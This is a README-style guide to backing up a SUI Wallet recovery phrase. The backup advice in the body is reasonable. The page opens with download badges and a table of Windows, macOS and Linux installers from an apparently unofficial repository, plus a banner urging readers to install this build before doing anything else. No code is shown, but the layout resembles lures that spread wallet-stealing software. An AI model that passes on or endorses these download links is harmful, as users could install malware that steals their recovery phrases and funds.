![SUI Wallet](assets/banner-article.png)

# Backing up your SUI Wallet recovery phrase

A backup is only a backup if it still works when the laptop does not.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A backup is the 24 words, in order, written on something that does not fail when the machine does - paper
or metal, stored away from the computer. A screenshot, a cloud note or a password manager entry is not a
backup; it is a copy of the account in a place an attacker can reach without ever touching your desk.

## What a backup is and is not

A backup is a copy of the thing that cannot be regenerated. For this wallet that is the 24-word phrase
and nothing else: not the application files, not a folder, not an export you could pull out of the app
later if you had thought ahead. The phrase is the only object whose loss is permanent.

That definition settles most backup questions before they are asked. If a copy would not let you restore
the account on a fresh machine with no access to this one, it is not a backup. If it would, then the only
question left is whether an attacker could reach that copy without entering your home.

## Paper, metal and the trade-offs

Paper is the default because it is offline, cheap and legible by anyone in fifty years. Its failure modes
are ordinary: water, fire, ink that fades, a drawer that gets cleared out during a move. Write on both
sides or use archival ink if the phrase is meant to outlast the decade.

Metal costs more and survives what paper does not - a house fire, a flood, a basement that stays damp for
a year. Stamped plates also look like what they are, which is a different risk: a conspicuous object
invites questions from people who visit.

Neither material protects against the real threat, which is somebody reading the words. A backup stored
in a place a housemate, a cleaner or a guest can open is a backup that shares the account with them.

## Verifying the backup before trusting it

An unverified backup is an assumption. The check is cheap: read the 24 words back from the copy, in
order, and restore them into a fresh account in the app - on the same machine is fine, as a throwaway.
The point is to catch a wrong word while the funds are still where you can move them.

The app shows the addresses it derived before it reports success, so the check is visual: if the funded
address appears, the copy is correct. If an empty address appears, the copy has a wrong word or a wrong
order, and you have found that out while the funds are still reachable.

[Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) covers the restore screen and what it shows, including
the case where the derived address is not the one expected.

## The second copy and where it goes

One copy is one incident away from being no copy. Two copies, in two places that fail independently, is
the minimum worth having: one at home, one somewhere that would survive the home - a safe deposit box, a
trusted relative's house, an office drawer.

Two places means two risks, so choose them for different failure modes rather than for convenience. Two
drawers in the same room fail together; a drawer and a cloud note fail in entirely different ways, and
only one of those ways is survivable.

If you keep a second copy with someone else, they should understand what it is. A relative who finds a
list of 24 words and photographs it "to be helpful" has just moved your backup into a phone.

## What never travels with the machine

The machine will be repaired, replaced, sold or lost, and each of those is an exit. What should not exit
with it: the phrase on a sticky note under the laptop, a text file in Documents, a photo in the Pictures
folder, a browser bookmark with the words in the title.

This is also the argument against storing the phrase in the wallet's own folder "so it is all in one
place". One place is exactly the problem: the folder goes when the machine goes, and it goes in a bag
with whoever took the machine.

[SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) covers the moment the words first appear on screen, which is the
only moment they are readable in the app.

## A backup is not a plan for a lost phrase

The phrase either exists somewhere you can reach or it does not; there is no partial recovery and no
authority that can reconstruct it. That is why the backup work happens before the wallet holds anything
of value, and why the verification step exists: a backup nobody has tested is a hope.

[Someone has my SUI Wallet seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/someone-has-my-sui-wallet-seed-phrase.md) covers the other failure - the phrase is intact but
someone else has it - which is a different problem with a different, and much faster, answer.

## FAQ

### Do I need to back up before I add funds?

Yes. Back up first, then add funds, then verify the backup by restoring it once. The order matters
because a backup made after the balance arrives is a backup made under pressure.

### Is a photo of the phrase good enough?

No. A photograph syncs to a cloud account, indexes in a gallery, and survives on devices you no longer
own. It is reachable without physical access to anything you control.

### Can I store the phrase in a password manager?

It is better than a photograph and worse than paper in a drawer, because the manager's vault is online by
design. If it is the only practical option for a second copy, it should not be the only copy.

### How many copies should I keep?

Two, in places that fail independently. More copies mean more places to leak; fewer mean one incident
ends the account.

### Does a backup expire?

No. The words do not age, and a copy that is legible is a copy that works - which is why fading ink and
damp storage are the things to worry about rather than time.

### Can I back up the account a different way, without the words?

The application does not need to be backed up, because it can be [downloaded again](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest). What cannot be
downloaded again is the phrase, and there is no second form of it to fall back on.
